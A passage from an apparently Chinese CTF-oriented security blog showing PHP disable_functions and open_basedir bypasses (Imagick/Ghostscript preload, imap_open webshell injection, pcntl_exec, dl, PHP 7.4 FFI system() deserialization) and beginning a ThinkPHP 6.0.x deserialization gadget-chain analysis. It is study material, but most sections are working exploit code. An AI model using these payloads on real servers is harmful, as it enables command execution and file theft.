<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@4c80e397e0b2:/<span class="comment"># php test.php</span></span><br><span class="line">bin   etc   hack.c   lib    mnt   readflag    run   sys       tmp</span><br><span class="line">boot  flag  hack.so  lib64  opt   readflag.c  sbin  test.php  usr</span><br><span class="line">dev   hack  home     media  proc  root        srv   test.wmv  var</span><br><span class="line">PHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-709mqrbus4dKcZ0.pam<span class="string">': No such file or directory @ error/blob.c/OpenBlob/2701 in /test.php:3</span></span><br><span class="line"><span class="string">Stack trace:</span></span><br><span class="line"><span class="string">#0 /test.php(3): Imagick-&gt;__construct('</span>test.wmv<span class="string">')</span></span><br><span class="line"><span class="string">#1 &#123;main&#125;</span></span><br><span class="line"><span class="string">  thrown in /test.php on line 3</span></span><br></pre></td></tr></table></figure>

<p>可以看到成功列了目录</p>
<p>当然，其他后缀是可以调用其他的新进程</p>
<p>从kylingit这位师傅博客可以看到部分列举出来的常见调用依赖</p>
<table>
<thead>
<tr>
<th>EPI/EPS/PDF/PS</th>
<th><a href="http://www.cs.wisc.edu/~ghost" target="_blank" rel="noopener">Ghostscript</a></th>
</tr>
</thead>
<tbody><tr>
<td>MNG/M2V</td>
<td><a href="https://www.ffmpeg.org/download.html" target="_blank" rel="noopener">ffmpeg</a></td>
</tr>
<tr>
<td>JXR</td>
<td><a href="https://jxrlib.codeplex.com/" target="_blank" rel="noopener">jxrlib</a></td>
</tr>
</tbody></table>
<p>更详细的可以直接参考一下官网<a href="https://imagemagick.org/script/formats.php" target="_blank" rel="noopener">https://imagemagick.org/script/formats.php</a></p>
<p>下面以PDF为例验证</p>
<p><img src="https://s2.ax1x.com/2019/10/04/uD9rn0.png" alt="uD9rn0.png"></p>
<p>这里的imagick似乎是是有一个禁止调用的名单，这里写的是gs的禁止调用名单，需要把none改为read|write,接下来的程序正常进行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'test.pdf'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/04/uDmFeJ.png" alt="uDmFeJ.png"></p>
<p>成功进行命令执行。</p>
<p>可以用strace具体看一下调用进程</p>
<p><img src="https://s2.ax1x.com/2019/10/04/urkE4K.png" alt="urkE4K.png"></p>
<p>从上图可以明显的看到在处理pdf后缀的时候会调用ghostscript，这样就满足了新进程，从而加载了我们__attribute__ ((__constructor__))部分</p>
<h4 id="利用imap-open"><a href="#利用imap-open" class="headerlink" title="利用imap_open"></a>利用imap_open</h4><p>这个东西之前也写过，直接放下poc和以前的文章链接好了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>$server = <span class="string">"any -o ProxyCommand=echo\t'\&lt;?php\tsystem(whoami);?&gt;'\t&gt;\t1.php"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);`</span><br></pre></td></tr></table></figure>

<p>一般利用imap进行bypass是没有回显的，所以一般把回显的结果写入文章内容</p>
<p>文章链接</p>
<p><a href="https://lihuaiqiu.github.io/2019/06/01/PHP邮件漏洞小结/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/06/01/PHP%E9%82%AE%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</a></p>
<h4 id="pcntl插件-bypass"><a href="#pcntl插件-bypass" class="headerlink" title="pcntl插件 bypass"></a>pcntl插件 bypass</h4><p>载安装pcntl插件的情况下，可以通过pcntl进行bypass。</p>
<p>如果在查看phpinfo()种看到enable-pcntl，并且在disable_functions允许的情况下，可以通过下面poc bypass</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exec.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> pcntl_exec(<span class="string">"/bin/bash"</span>, <span class="keyword">array</span>(<span class="string">"/tmp/b4dboy.sh"</span>));&gt;</span><br><span class="line"><span class="comment">#/tmp/b4dboy.sh#!/bin/bash</span></span><br><span class="line">ls -l /</span><br></pre></td></tr></table></figure>

<h4 id="外部扩展库dl-bypass"><a href="#外部扩展库dl-bypass" class="headerlink" title="外部扩展库dl bypass"></a>外部扩展库dl bypass</h4><p>dl扩展库的详细安装过程</p>
<p><a href="http://reverse-tcp.xyz/php/pentest/2016/12/22/php-disabled_functions-bypass.html" target="_blank" rel="noopener">http://reverse-tcp.xyz/php/pentest/2016/12/22/php-disabled_functions-bypass.html</a></p>
<p>dl bypass-poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">dl(<span class="string">"dl.so"</span>);  <span class="comment">//dl.so在extension_dir目录，如不在则用../../来实现调用</span></span><br><span class="line">confirm_dl_compiled(<span class="string">"$_GET[a]&gt;;1.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要就是dl.so这个文件的搜索，通过调用dl.so进行命令执行。</p>
<h4 id="PHP7-4-FFI-bypass"><a href="#PHP7-4-FFI-bypass" class="headerlink" title="PHP7.4-FFI bypass"></a>PHP7.4-FFI bypass</h4><p>在RCTF2019中出的题，考察了php7.4的新特性，通过新加的FFI即可bypass disable function</p>
<p>preload代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">    array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>官方给的调用形式如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int printf(const char *format, ...);"</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"><span class="comment">// call C's printf()</span></span><br><span class="line">$ffi-&gt;printf(<span class="string">"Hello %s!\n"</span>, <span class="string">"world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于FFI::cdef中第二个参数不进行传参也可以，并且在php7.4中我们我们可以通过__unserialize和<em>\</em>serialize来控制自定义对象的序列化</p>
<p>最终poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#39;);$a-&gt;ret-&gt;system(&#39;curl xx&#39;);</span><br></pre></td></tr></table></figure>

<p>调用流程：反序列化触发__unserialize，通过调用不存在的变量名ret触发__get，最后进行FFI命令执行</p>
<h3 id="Bypass-open-basedir"><a href="#Bypass-open-basedir" class="headerlink" title="Bypass open_basedir"></a>Bypass open_basedir</h3><h4 id="chdir-bypass"><a href="#chdir-bypass" class="headerlink" title="chdir bypass"></a>chdir bypass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'/tmp/test'</span>);chdir(<span class="string">'/tmp/test/'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(file_get_contents(<span class="string">"/flag"</span>));</span><br></pre></td></tr></table></figure>

<h4 id="glob-bypass"><a href="#glob-bypass" class="headerlink" title="glob bypass"></a>glob bypass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面是比较常见的open_basedir bypass，也还有好几种bypass.</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>上面在bypass disabled_functions我少写了一个mod_cgi的bypass，在bypass open_basedir中少写了一个fpm bypass的方法，主要是想这两个方法都很有意思，准备单独拿出来写一下，在以后的文章中会看到他们的身影。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/09/Bypass-disabled-functions-open-basedir-php/" data-id="ckabsu37t000fkkvrad636pl2" class="article-share-link" data-share="baidu" data-title="Bypass disabled_functions &amp; open_basedir-php">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/09/Bypass-disabled-functions-open-basedir-php/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Thinkphp-6-0-x-pop链分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/09/Thinkphp-6-0-x-pop%E9%93%BE%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2019-10-09T10:17:06.000Z" itemprop="datePublished">2019-10-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/09/Thinkphp-6-0-x-pop%E9%93%BE%E5%88%86%E6%9E%90/">Thinkphp 6.0.x pop链分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>接着上次的来分析一下Thinkphp6.0.x的pop链</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think&#x3D;6.0.x-dev v6.0</span><br></pre></td></tr></table></figure>

<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><img src="https://s2.ax1x.com/2019/10/08/uhhITU.png" alt="uhhITU.png"></p>
<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>从5.1看到6.0发现Thinkphp的改变还是有点大的，在5.2中因为删掉了Request类中的__call方法导致后面的链需要重新寻找，而6.0的链还可以继续用5.2.x __toString后面的链，但是由于Thinkphp6.0删掉了Windows类，所以原来的Windows-&gt;__destruct()触发点没了，需要重新找到一个合适的触发点。</p>
<p><strong>新的触发点位于Model.php类中的__destruct</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>将$this-&gt;lazySave设置为True，进入save()函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 数据对象赋值</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setAttrs($data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p><strong>这里我们要进入updataData函数，所以要考虑一下前面几个条件的满足情况</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟着isEmpty()</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要$this-&gt;data为一个非空数组这样就满足返回是false了，接着跟进trigger</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>控制$this-&gt;withEvent为False就可以了</p>
<p>再回到save函数中看一下，我们前面的函数都满足了，最后再设$this-&gt;exists为true就可以进入updateData函数了，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 事件回调</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;checkData();</span><br><span class="line">    <span class="comment">// 获取有更新的数据</span></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="comment">// 关联更新</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoRelationUpdate();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">        $allowFields = <span class="keyword">$this</span>-&gt;checkAllowFields();</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p><strong>下面这部分代码已经满足了，直接往下走</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进checkData()</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkData</span><span class="params">()</span>: <span class="title">void</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>似乎没影响，接着跟进getChangedData()</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只读字段不允许更新</span></span><br><span class="line">....</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以设置$this-&gt;force为true，这样返回的就是我们设置的非空data数组了</p>
<p><strong>最终进入checkAllowFields()函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测字段</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $query = <span 